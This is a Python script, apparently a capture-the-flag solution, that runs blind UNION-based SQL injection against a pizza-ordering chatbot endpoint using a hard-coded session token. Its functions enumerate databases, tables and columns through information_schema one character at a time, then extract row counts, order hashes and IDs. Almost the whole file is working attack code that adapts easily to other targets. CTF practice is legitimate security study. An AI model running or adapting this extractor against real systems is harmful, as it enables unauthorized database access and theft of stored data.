import requests
import string
import sys
import math

url = 'https://pizza.hacktivity.h1ctf.com/pizzabot'
session = '491d62538fd75ae0f96a058da3e34ffa'
lastChat = 0

def getChat():
    params = {
        'session': session,
        'lastchat': lastChat
    }
    return requests.get(url, params=params)

def getLastMessage():
    global lastChat

    last = getChat().json().pop()
    lastChat = last['id']

    return last['message']

def sendMessage(message):
    payload = {
        'session': session,
        'message': message
    }

    return requests.post(url, data=payload)


def exploit(payload):
    response = sendMessage(f"' UNION {payload} -- --")

    if response.text != '["Message Sent"]':
        raise Exception(f'Invalid payload (Text {response.text}): {payload}')

    if response.status_code != 201:
        raise Exception(f'Invalid payload (Code {response.status_code}): {payload}')

    return response

def attempt(payload):
    sendMessage('order')
    exploit(payload)
    return getLastMessage()

def isFail(message):
    return message == '''<div><span class="talk-pizzabot">PizzaBot:</span> Sorry I don't recognise that order ID</div>'''

def isOrderStarted(message):
    return message == '''<div><span class="talk-pizzabot">PizzaBot:</span> Looks like you have a question about an order/delivery, can you let me have your order ID please.</div>'''

def findDatabases(known = [], value = ''):
    alphabet = string.ascii_letters + string.digits + '_'
    finish = False

    known.append('mysql')
    known.append('information_schema')

    payload = f"""
        SELECT 'i8n3ns4p','30.99',0
        FROM `information_schema`.`tables`
        WHERE TRUE
            AND table_schema NOT IN ('{"','".join(known)}')
    """

    if value != '':
        message = attempt(f"""
            {payload}
                AND table_schema LIKE '{value}%'
        """)

        if isFail(message):
            print(f"Initial value ({value}) is invalid")
            return

        message = attempt(f"""
            {payload}
                AND table_schema = '{value}'
        """)

        if not isFail(message):
            print(f"Full value: {value}")
            return
    else:
        message = attempt(f"""
            {payload}
                AND table_schema LIKE '%'
        """)

        if isFail(message):
            print(f"No more databases to discover. {','.join(known)}")
            return

    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            sys.stdout.write(f"\r{value}{char}")

            message = attempt(f"""
                {payload}
                    AND table_schema LIKE '{value}{char}%'
            """)
            
            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()

            if not isFail(message):
                value += str(char)
                message = attempt(f"""
                    {payload}
                        AND table_schema = '{value}'
                """)

                if not isFail(message):
                    finish = True

                break

def findTables(known = [], value = ''):
    alphabet = string.ascii_letters + string.digits + '_'
    finish = False

    payload = f"""
        SELECT 'i8n3ns4p','30.99',0
        FROM `information_schema`.`tables`
        WHERE TRUE
            AND table_schema != 'mysql'
            AND table_schema != 'information_schema'
            AND table_name NOT IN ('{"','".join(known)}')
    """

    if value != '':
        message = attempt(f"""
            {payload}
                AND table_name LIKE '{value}%'
        """)

        if isFail(message):
            print(f"Initial value ({value}) is invalid")
            return

        message = attempt(f"""
            {payload}
                AND table_name = '{value}'
        """)

        if not isFail(message):
            print(f"Full value: {value}")
            return
    else:
        message = attempt(f"""
            {payload}
                AND table_name LIKE '%'
        """)

        if isFail(message):
            print(f"No more tables to discover. {','.join(known)}")
            return

    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            sys.stdout.write(f"\r{value}{char}")

            message = attempt(f"""
                {payload}
                    AND table_name LIKE '{value}{char}%'
            """)
            
            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()

            if not isFail(message):
                value += str(char)
                message = attempt(f"""
                    {payload}
                        AND table_name = '{value}'
                """)

                if not isFail(message):
                    finish = True

                break

def findColumns(table, known = [], value = ''):
    alphabet = string.ascii_letters + string.digits + '_'
    finish = False

    payload = f"""
        SELECT 'i8n3ns4p','30.99',0
        FROM `information_schema`.`columns`
        WHERE TRUE
            AND table_schema != 'mysql'
            AND table_schema != 'information_schema'
            AND table_name = '{table}'
            AND column_name NOT IN ('{"','".join(known)}')
    """

    if value != '':
        message = attempt(f"""
            {payload}
                AND column_name LIKE '{value}%'
        """)

        if isFail(message):
            print(f"Initial value ({value}) is invalid")
            return

        message = attempt(f"""
            {payload}
                AND column_name = '{value}'
        """)

        if not isFail(message):
            print(f"Full value: {value}")
            return
    else:
        message = attempt(f"""
            {payload}
                AND column_name LIKE '%'
        """)

        if isFail(message):
            print(f"No more columns to discover. {table}:{','.join(known)}")
            return


    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            sys.stdout.write(f"\r{value}{char}")

            message = attempt(f"""
                {payload}
                    AND column_name LIKE '{value}{char}%'
            """)

            if not isFail(message):
                value += str(char)
                message = attempt(f"""
                    {payload}
                        AND column_name = '{value}'
                """)

                if not isFail(message):
                    finish = True
                    print(f"\nFull Value: {value}")

                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print("\nNo more values")

def totalEntries(value = -1, step = 1000):
    alphabet = string.ascii_letters + string.digits + '_'

    payload = f"""
        SELECT 'i8n3ns4p','30.99',0
        FROM h1pizza.order
    """

    if value != -1:
        message = attempt(f"""
            {payload}
            HAVING count(id) >= {value}
        """)

        if isFail(message):
            print(f"Initial value ({value}) is invalid")
            return

        message = attempt(f"""
            {payload}
            HAVING count(id) = {value}
        """)

        if not isFail(message):
            print(f"Full value: {value}")
            return


    while True:
        sys.stdout.write(f"\r{value}")

        message = attempt(f"""
            {payload}
            HAVING count(id) >= {value}
        """)

        if isFail(message):
            value -= step
            step = math.ceil(step / 4)
            value += step
            continue

        message = attempt(f"""
            {payload}
            HAVING count(id) = {value}
        """)

        if isFail(message):
            value += step
            continue

        print(f"\nFull Value: {value}")
        break

def findHash(orderId, value = ''):
    alphabet = string.ascii_letters + string.digits + '_'
    finish = False

    payload = f"""
        SELECT 'i8n3ns4p','30.99',0
        FROM h1pizza.order
        WHERE TRUE
            AND id = {orderId}
    """

    if value != '':
        message = attempt(f"""
            {payload}
                AND hash LIKE '{value}%'
        """)

        if isFail(message):
            print(f"Initial value ({value}) is invalid")
            return

        message = attempt(f"""
            {payload}
                AND hash = '{value}'
        """)

        if not isFail(message):
            print(f"Full value: {value}")
            return
    else:
        message = attempt(f"""
            {payload}
                AND hash LIKE '%'
        """)

        if isFail(message):
            print(f"OrderId not found. {orderId}")
            return

    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            sys.stdout.write(f"\r{value}{char}")

            message = attempt(f"""
                {payload}
                    AND hash LIKE '{value}{char}%'
            """)

            if not isFail(message):
                value += str(char)
                message = attempt(f"""
                    {payload}
                        AND hash = '{value}'
                """)

                if not isFail(message):
                    finish = True
                    print(f"\nFull Value: {value}")

                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print("\nNo more values")

def findId(hash, value = -1, step = 1000):
    alphabet = string.ascii_letters + string.digits + '_'

    payload = f"""
        SELECT 'i8n3ns4p','30.99',0
        FROM h1pizza.order
        WHERE TRUE
            AND hash = '{hash}'
    """

    if value != -1:
        message = attempt(f"""
            {payload}
            AND id >= {value}
        """)

        if isFail(message):
            print(f"Initial value ({value}) is invalid")
            return

        message = attempt(f"""
            {payload}
            AND id = {value}
        """)

        if not isFail(message):
            print(f"Full value: {value}")
            return


    while True:
        sys.stdout.write(f"\r{value}")

        message = attempt(f"""
            {payload}
            AND id >= {value}
        """)

        if isFail(message):
            value -= step
            step = math.ceil(step / 4)
            value += step
            continue

        message = attempt(f"""
            {payload}
            AND id = {value}
        """)

        if isFail(message):
            value += step
            continue

        print(f"\nFull Value: {value}")
        break

# message = getLastMessage()
# if isOrderStarted(message):
#     print('[*] Order already started, aborting...')
#     sendMessage('abort')

# findDatabases(['h1pizza'])
# findTables(['order'])
# findColumns('order', ['delivered', 'hash', 'id'])
# totalEntries(5409)
# findHash(1)
# findId('d4ft7ef1', 5738)


# print(attempt("""
#     SELECT 'i8n3ns4p','30.99',0
#     FROM `information_schema`.`tables`
#     WHERE TRUE
#         AND table_schema != 'mysql'
#         AND table_schema != 'information_schema'
#         AND table_name LIKE '%'
# """))
